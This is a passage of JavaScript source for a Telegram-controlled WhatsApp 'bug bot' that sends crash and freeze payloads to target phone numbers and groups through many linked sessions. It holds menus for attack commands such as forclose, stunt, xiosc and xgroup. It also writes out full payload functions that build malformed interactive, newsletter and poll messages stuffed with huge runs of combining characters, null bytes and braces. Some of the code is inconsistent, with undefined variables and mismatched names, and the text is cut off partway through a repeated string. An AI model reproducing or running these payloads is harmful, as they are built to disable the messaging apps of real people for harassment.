            break;
          case "xiosc":
            for (let i = 0; i < 100; i++) {
              await IosXCrash(sheesh, target);
              await VampCrashFCIphone(sheesh, target);
              await sleep(1000);
            }
            break;
          case "splash":
            for (let i = 0; i < 100; i++) {
              await CallUi(sheesh, target);
              await QiBug(sheesh, target);
              await sleep(1000);
            }
            break;
          case "bulldozer":
            for (let i = 0; i < 250; i++)
             await CtaZts(sheesh, target);
             await XProtexBlankXDelay(target);
             await sleep(1000);
            break;
        }
        successCount++;
      } catch {
        failCount++;
      }
    }

    if (!resultCaption) {
      resultCaption = `\`\`\`
╭────────────────────────────
│ 🎯 Target: ${params.join(",")}
│ 🐞 Bug Type: ${action.toUpperCase()}
│ ✅ Success: ${successCount}
│ ❌ Failed: ${failCount}
│ 🤖 Total Bots: ${sessions.size}
╰────────────────────────────
\`\`\``;
    }

    await bot.editMessageCaption(resultCaption, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
    });

    await bot.answerCallbackQuery(query.id);
  } catch (err) {
    console.error("Error handling callback_query:", err);
    await bot.answerCallbackQuery(query.id, { text: "Terjadi kesalahan.", show_alert: true });
  }
});


bot.on("callback_query", async (query) => {
  const data = query.data;
  if (!data || !query.message) return;

  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const name = query.from.username || query.from.first_name;

  // Menu handler
  if (data === "menu1") {
    await bot.editMessageCaption(
      `\`\`\`
╭═════════════════⚉
│ ⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
╰═════════════════⚉
╭═════════════════⚉
│ ⚘ BUG MENU ⚘
│ ⚉ /Delayhard <number>
│ ⚉ /forclose <number1>,<number2>
│ ⚉ /blank <number> <1jam>
│ ⚉ /splash <number>
│ ⚉ /xiosc <number>
│ ⚉ /xgroup <link-group>
│ ⚉ /xcomu <link-group>
╰═════════════════⚉
╭═════════════════⚉
│ ⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
╰═════════════════⚉
\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "BACK", callback_data: `backmenu` }]],
        },
      }
    );
    return;
  }

  if (data === "backmenu") {
    await bot.editMessageCaption(
      `\`\`\`Xyraa4Sx
╭══════════════════⚉
│⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
╰══════════════════⚉
╭══════════════════⚉
│ ⚉ /menu
│ ⚉ /allteam
╰══════════════════⚉
╭══════════════════⚉
│⚘ 𝖶𝖤𝖫𝖢𝖮𝖬𝖤 @${name} ⚘
╰══════════════════⚉
\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
           [{ text: "𐚁 BUG MAIN", callback_data: "menu1" }],
            [{ text: "⚘ CHANNELS", url: "https://t.me/onlyRaa4Sx" }],
          ],
        },
      }
    );
    return;
  }
  if (data === "allmenu") {
    await bot.editMessageCaption(
    `\`\`\`HelloWorld!!!
╭══════════════════⚉ 
│⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
│    𝖵𝖤𝖱𝖲𝖨𝖮𝖭 𝟦.𝟧 𝖲𝖵𝖵𝖨𝖯
│ PENGGUNA @${name}
╰══════════════════⚉
╭══════════════════⚉
│ ⚘ BUG MENU ⚘
│ ⚉ /zec <number>
│ ⚉ /multimate <number1>,<number2>
│ ⚉ /stunt <number> <3jam>
│ ⚉ /splash <number>
│ ⚉ /xiosc <number>
│ ⚉ /xiosi <number>
│ ⚉ /xgrup <link-group>
│ ⚉ /xcomu <link-group>
╰══════════════════⚉
╭══════════════════⚉
│  ⚘ OWNER MENU ⚘
│ ⚉ /addbot <number>
│ ⚉ /delbot <number>
│ ⚉ /addowner <id>
│ ⚉ /addvip <id> <day>
│ ⚉ /addprem <id> <day>
│ ⚉ /delowner <id>
│ ⚉ /delvip <id>
│ ⚉ /delprem <id>
│ ⚉ /setcd <id> <duration>
│ ⚉ /viponly <command>
│ ⚉ /premiumonly <command>
│ ⚉ /owneronly <command>
│ ⚉ /devices
│ ⚉ /restart
│ ⚉ /clearall
╰══════════════════⚉
╭══════════════════⚉ 
│⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
│    𝖵𝖤𝖱𝖲𝖨𝖮𝖭 𝟦.𝟧 𝖲𝖵𝖵𝖨𝖯
╰══════════════════⚉
\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
          [{ text: "⚉ BACK", callback_data: "backmenu" }],
            [{ text: "⚘ CHANNELS", url: "https://t.me/onlyRaa4Sx" }],
          ],
        },
      }
    );
    return;
  }

  // Attack command handler
  const [action, ...params] = data.split("_");
  let successCount = 0;
  let failCount = 0;

  if (action === "forclose") {
    const targets = params[0]?.split(",");
    if (!targets || targets.length === 0) return;

    for (const target of targets) {
      const jid = `${target}@s.whatsapp.net`;
      for (const [botNum, sheesh] of sessions.entries()) {
        try {
          for (let i = 0; i < 50; i++) {
            await Warlock(sheesh, target);
            await pollingBugs(sheesh, target);
            await new Promise((r) => setTimeout(r, 1000));
            await Warlock(sheesh, target);
            await pollingBugs(sheesh, target);
            await new Promise((r) => setTimeout(r, 1000));
          }
          successCount++;
        } catch {
          failCount++;
        }
      }
    }
  } else if (action === "stunt") {
  const rawTarget = (params[0] || "").replace(/[^0-9]/g, "");
  const durationMs = parseInt(params[1]) || 60000;
  const rawDuration = params[2] || `${Math.ceil(durationMs / 1000)} detik`;
  const durationCycles = Math.floor(durationMs / 5000);
  const jid = rawTarget.includes("@s.whatsapp.net") ? rawTarget : `${rawTarget}@s.whatsapp.net`;

  for (let step = 0; step <= 4; step++) {
    const percentage = (step / 4) * 100;
    const progressBar = "▓▓▓".repeat(step) + "░░░".repeat(4 - step);
    const isProcessing = percentage < 100;
    await bot.editMessageCaption(
      `\`\`\`
╭──────────────────────
│   ${isProcessing ? "      WAIT        " : "    PROCESSING     "}
│──────────────────────
│ Target: ${rawTarget}
│ ${isProcessing ? `Loading: [${progressBar} ${percentage.toFixed(0)}%]` : "Status: Sending Bug..."}
╰──────────────────────\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
      }
    );
    await new Promise((resolve) => setTimeout(resolve, 500));
  }

  for (const [botNum, sheesh] of sessions.entries()) {
    try {
      for (let i = 0; i < durationCycles; i++) {
        await XProtexBlankChatV3(sheesh, target);
        pollingBugs(sheesh, target);
        await new Promise((r) => setTimeout(r, 1000));
        await XProtexBlankChatV3(sheesh, target);
        pollingBugs(sheesh, target);
        await new Promise((r) => setTimeout(r, 1000));
      }
      successCount++;
    } catch {
      failCount++;
    }
  }

  await bot.editMessageCaption(
  `\`\`\`
╭────────────────────────────
│ 🎯 Target: ${rawTarget}
│ 📆 Durasi: ${rawDuration}
│ 🐞 Bug Type: STUNT
│ ✅ Success: ${successCount}
│ ❌ Failed: ${failCount}
│ 🤖 Total Bots: ${sessions.size}
╰────────────────────────────
\`\`\``,
    {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown"
    }
  );

  await bot.answerCallbackQuery(query.id);
} else if (action === "Delayhard") {
  const rawTarget = (params[0] || "").replace(/[^0-9]/g, "");
  const durationMs = parseInt(params[1]) || 60000;
  const rawDuration = params[2] || `${Math.ceil(durationMs / 1000)} detik`;
  const jid = `${rawTarget}@s.whatsapp.net`;
  const durationCycles = Math.floor(durationMs / 5000);

  for (let step = 0; step <= 4; step++) {
    const percentage = (step / 4) * 100;
    const progressBar = "▓▓▓".repeat(step) + "░░░".repeat(4 - step);
    const isProcessing = percentage < 100;

    await bot.editMessageCaption(
      `\`\`\`
╭──────────────────────
│   ${isProcessing ? "      WAIT        " : "    PROCESSING     "}
│──────────────────────
│ Target: ${rawTarget}
│ ${isProcessing ? `Loading: [${progressBar} ${percentage.toFixed(0)}%]` : "Status: Sending Bug..."}
╰──────────────────────\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
      }
    );
    await new Promise((resolve) => setTimeout(resolve, 500));
  }

  for (const [botNum, sheesh] of sessions.entries()) {
    try {
      for (let i = 0; i < durationCycles; i++) {
        await Scaryy4Hard(target, mention);
        await sleep(2500);
        await new Promise((r) => setTimeout(r, 1000));
        await Scaryy4Hard(target, mention);
        await sleep(2500);
        await new Promise((r) => setTimeout(r, 1000));
      }
      successCount++;
    } catch {
      failCount++;
    }
  }

  await bot.editMessageCaption(
    `\`\`\`
╭────────────────────────────
│ 🎯 Target : ${rawTarget}
│ 📆 Durasi : ${rawDuration}
│ 🐞 Bug Type : SPLASH
│ ✅ Success : ${successCount}
│ ❌ Failed  : ${failCount}
│ 🤖 Total Bots : ${sessions.size}
╰────────────────────────────
\`\`\``,
    {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
    }
  );

  await bot.answerCallbackQuery(query.id);
  } else if (action === "xgroup") {
  const inviteCode = params.join("_");

  let groupJid = null;
  let successCount = 0;
  let failCount = 0;

  for (const [botNum, sheesh] of sessions.entries()) {
    try {
      const meta = await sheesh.groupGetInviteInfo(inviteCode);
      if (!meta?.id) continue;

      groupJid = meta.id;

      for (let i = 0; i < 100; i++) {
        await DelayGroup(sheesh, groupJid);
        await new Promise((r) => setTimeout(r, 1000));
        await SnitchDelayVolteX(sheesh, groupJid);
        await new Promise((r) => setTimeout(r, 1000));
        await GroupUi(sheesh, groupJid);
        await new Promise((r) => setTimeout(r, 1000));
      }

      successCount++;
    } catch (err) {
      failCount++;
    }
  }

  await bot.editMessageCaption(
    `\`\`\`
╭═════════════════⚉
│ ⚘ GROUP ATTACK  ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Link     : https://chat.whatsapp.com/${inviteCode}
│ Group ID : ${groupJid || "Gagal"}
│ Bot Aktif : ${sessions.size}
│ Success   : ${successCount}
│ Failed    : ${failCount}
│ Total Bots  : ${sessions.size}
╰═════════════════⚉
\`\`\``,
    {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown"
    }
  );

  await bot.answerCallbackQuery(query.id);
  } else if (action === "xcomu") {
  const inviteCode = params.join("_");

  let groupJid = null;
  let successCount = 0;
  let failCount = 0;
  let isCommunity = false;

  for (const [botNum, sheesh] of sessions.entries()) {
    try {
      const meta = await sheesh.groupGetInviteInfo(inviteCode);
      if (!meta?.id) continue;

      groupJid = meta.id;
      const metadata = await sheesh.groupMetadata(groupJid);

      isCommunity = !!metadata?.parentGroupId;
      const targetJid = metadata?.parentGroupId || groupJid;

      for (let i = 0; i < 100; i++) {
        await SnitchDelayVolteX(sheesh, targetJid);
        await new Promise((r) => setTimeout(r, 1000));
        await GroupUi(sheesh, groupJid);
        await new Promise((r) => setTimeout(r, 1000));
        await DelayGroup(sheesh, groupJid);
        await new Promise((r) => setTimeout(r, 1000));
      }

      successCount++;
    } catch (err) {
      failCount++;
    }
  }

  await bot.editMessageCaption(
    `\`\`\`
╭═════════════════⚉
│ ⚘ XCOMU ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Link       : https://chat.whatsapp.com/${inviteCode}
│ Parent     : ${isCommunity ? "✅ Ya" : "❌ Tidak"}
│ Target ID : ${groupJid || "Tidak ditemukan"}
│ Success    : ${successCount}
│ Failed     : ${failCount}
│ Total Bots  : ${sessions.size}
╰═════════════════⚉
\`\`\``,
    {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown"
    }
  );

  await bot.answerCallbackQuery(query.id);
  } else if (["bulldozer", "xiosc"].includes(action)) {
    const number = params[0];
    const jid = `${number}@s.whatsapp.net`;

    for (let step = 0; step <= 4; step++) {
      const percentage = (step / 4) * 100;
      const progressBar = "▓▓▓".repeat(step) + "░░░".repeat(4 - step);
      const isProcessing = percentage < 100;
      await bot.editMessageCaption(
        `\`\`\`
╭──────────────────────
│   ${isProcessing ? "      WAIT        " : "    PROCESSING     "}
│──────────────────────
│ Target: ${number}
│ ${
          isProcessing
            ? `Loading: [${progressBar} ${percentage.toFixed(0)}%]`
            : "Status: Sending Bug..."
        }
╰──────────────────────\`\`\``,
        {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "Markdown",
        }
      );
      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    for (const [botNum, sheesh] of sessions.entries()) {
      try {
        switch (action) {
          case "bulldozer":
            for (let i = 0; i < 50; i++) {
              await Warlock(sheesh, target);
              await new Promise((r) => setTimeout(r, 1000));
               await Warlock(sheesh, target);
               await new Promise((r) => setTimeout(r, 1000));          
            }
            break;
            case "xiosc":
            for (let i = 0; i < 100; i++) {
              await iosinVisFC(sheesh, target, false);
              await new Promise((r) => setTimeout(r, 1000));
              await iosinVisFC(sheesh, target, false);
              await new Promise((r) => setTimeout(r, 500));
            }
            break;
            case "xiosi":
            for (let i = 0; i < 100; i++) {
              await iosInVisNEW(sheesh, target, false);
              await new Promise((r) => setTimeout(r, 1000));
              await iosinVisNEW(sheesh, target, false);
              await new Promise((r) => setTimeout(r, 500));
            }
            break;
        }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }
  }

  if (["multimate", "xiosi", "xiosc", "bulldozer"].includes(action)) {
  await bot.editMessageCaption(
    `\`\`\`
╭────────────────────────────
│ 🎯 Target: ${params.join(",")}
│ 🐞 Bug Type: ${action.toUpperCase()}
│ ✅ Success: ${successCount}
│ ❌ Failed: ${failCount}
│ 🤖 Total Bots: ${sessions.size}
╰────────────────────────────
\`\`\``,
    {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
    }
  );
}

  await bot.answerCallbackQuery(query.id);
});
// ======[ FUNGSI PLACE ]==============
async function XProtexBlankChatV3(sheesh, target) {
  const XProtex = '_*~@2~*_\n'.repeat(10500);
  const Private = 'ោ៝'.repeat(10000);
   
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "𝗥𝗔𝗔𝟰𝗦𝗫" + "ោ៝".repeat(20000),
      caption: "𝗥𝗔𝗔𝟰𝗦𝗫" + Private + "ោ៝".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  await sheesh.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });

  const messageCrash2 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: sheesh.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: ""
                    },
                },
              },
            body: {
              text: "Hi I'm Raa4Sx!!" + "ꦾ".repeat(2000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
              ],
            },
          },
        },
      },
    };
    await sheesh.relayMessage(target, messageCrash2, {
      participant: { jid: target },
    });

const VaxzyXx = JSON.stringify({
  status: true,
  criador: "VerloadXApiBug",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

async function VerloadForceDelMsg(sheesh, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              questionMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "Hi I'm Vaxzy!!" + "ោ៝".repeat(10000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: VaxzyXx + "{".repeat(20000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: VaxzyXx + "{".repeat(20000),
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
    
  await sheesh.relayMessage(sheesh, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

  await sheesh.sendMessage(target, { delete: msg.key });
  console.log(chalk.green(`Succes Sending Bug Forclose To ${target}`));
  }

    console.log(`Succes Sending Bug Crash By XREBELIOUNZ To ${target}`);
      }
      
async function pollingBugs(sheesh, target) {

const mediaBuffer1 = null;
const mediaBuffer2 = null;

function toHash(buffer) {
  return crypto.createHash("sha256").update(buffer).digest();
}

const xname = " #4izxvelzExerc1st.ϟ\n\n";
const options = [];

for (let r = 0; r < 19; r++) {
  options.push({
    optionName: xname[r],
    optionHash: null
  });
}

const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
  pollCreationMessageV4: {
    message: {
      messageContextInfo: {
        messageSecret: crypto.randomBytes(32),
        messageAssociation: {
          associationType: 7,
          parentMessageKey: crypto.randomBytes(16)
        }
      },
      pollCreationMessageV3: {
        name: xname + "\x10".repeat(2000),
        options: [
          {
            optionName: "execute" + "ꦽ".repeat(2000),
            optionHash: toHash(mediaBuffer1)
          },
          {
            optionName: "null" + "ꦽ".repeat(2000),
            optionHash: toHash(mediaBuffer2)
          }
        ],
        selectableOptionsCount: 0,
        pollContentType: 2,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          participant: "13135550001@s.whatsapp.net",
          remoteJid: "status@broadcast",
          isBroadcast: true,
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: true,
            id: "ABCDEF1234567890"
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net"
          },
          dataSharingContext: {
            showMmDisclosure: true
          },
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "@sheesh",
                format: 1
              },
              nativeFlowResponseMessage: {
                name: "payment_methode",
                paramsJson: "",
                version: 3
              }
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterName: "© running since 2020 to 20##?",
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            contentType: "UPDATE",
            accessibilityText: ""
          }
        },
        viewOnce: true,
        annotations: [
          {
            polygonVertices: [
              { x: 60.71664810180664, y: -36.39784622192383 },
              { x: -16.710189819335938, y: 49.263675689697266 },
              { x: -56.585853576660156, y: 37.85963439941406 },
              { x: 20.840980529785156, y: -47.80188751220703 }
            ],
            newsletter: {
              newsletterJid: "120363321780343299@newsletter",
              newsletterName: "-i'am rizxvelz? bit*h",
              contentType: "UPDATE",
              accessibilityText: ""
            }
          }
        ]
      },
      pollType: "POLL"
    }
  }
}), { participant: { jid: target } });

await sheesh.relayMessage(target, msg.message, {
  messageId: msg.key.id
});
}

async function Scaryy4Hard(sheesh, mention) {
  for (let i = 0; i < 100; i++) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉